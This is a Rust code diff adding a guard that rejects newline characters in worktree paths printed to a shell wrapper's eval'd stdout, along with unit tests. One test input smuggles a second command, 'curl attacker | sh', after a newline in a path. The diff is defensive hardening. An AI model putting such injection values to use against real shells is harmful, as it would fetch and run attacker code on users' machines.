@@ -51,11 +51,35 @@ impl Outcome {
     }
 
     /// A command emitting verbatim stdout text (e.g. `shell-setup`).
+    ///
+    /// Use this only for TRUSTED, hand-built payloads (the wrapper function /
+    /// completion script) that legitimately contain newlines. For an untrusted
+    /// path destined for the eval'd stdout, use [`Outcome::stdout_path`].
     pub fn stdout(text: impl Into<String>) -> Self {
         Outcome {
             cd_path: None,
             stdout: Some(text.into()),
         }
+    }
+
+    /// A command emitting a single PATH on stdout (the Claude-Code worktree-hook
+    /// protocol), guarded like [`Outcome::cd`].
+    ///
+    /// The shell wrapper evals all stdout, and a worktree path can be derived
+    /// from a user `path_script`/settings template, so a `\n`/`\r` in it would
+    /// split the eval'd line and inject a second command. Reject it at the
+    /// source, mirroring the `cd_path` newline guard in the binary.
+    pub fn stdout_path(path: impl Into<String>) -> Result<Self> {
+        let path = path.into();
+        if path.contains('\n') || path.contains('\r') {
+            return Err(VibeError::Worktree(
+                "refusing to emit a path containing a newline".to_string(),
+            ));
+        }
+        Ok(Outcome {
+            cd_path: None,
+            stdout: Some(path),
+        })
     }
 }
 
@@ -178,5 +202,36 @@ impl StartCommand for RealStart<'_> {
             &StartFlags::default(),
             crate::output::OutputOptions::default(),
         )
+    }
+}
+
+#[cfg(test)]
+mod outcome_tests {
+    use super::Outcome;
+
+    #[test]
+    fn stdout_path_accepts_a_clean_path() {
+        let outcome = Outcome::stdout_path("/repos/project/feature").unwrap();
+        assert_eq!(outcome.stdout.as_deref(), Some("/repos/project/feature"));
+        assert_eq!(outcome.cd_path, None);
+    }
+
+    #[test]
+    fn stdout_path_rejects_newline() {
+        // A path that would split the eval'd line and inject a second command.
+        assert!(Outcome::stdout_path("/tmp/evil\ncurl attacker | sh").is_err());
+    }
+
+    #[test]
+    fn stdout_path_rejects_carriage_return() {
+        assert!(Outcome::stdout_path("/tmp/evil\rsomething").is_err());
+    }
+
+    #[test]
+    fn verbatim_stdout_still_allows_newlines() {
+        // shell-setup's hand-built wrapper text legitimately contains newlines and
+        // must NOT be rejected — that is what the unguarded `stdout` ctor is for.
+        let outcome = Outcome::stdout("vibe() { :; }\n");
+        assert_eq!(outcome.stdout.as_deref(), Some("vibe() { :; }\n"));
     }
 }
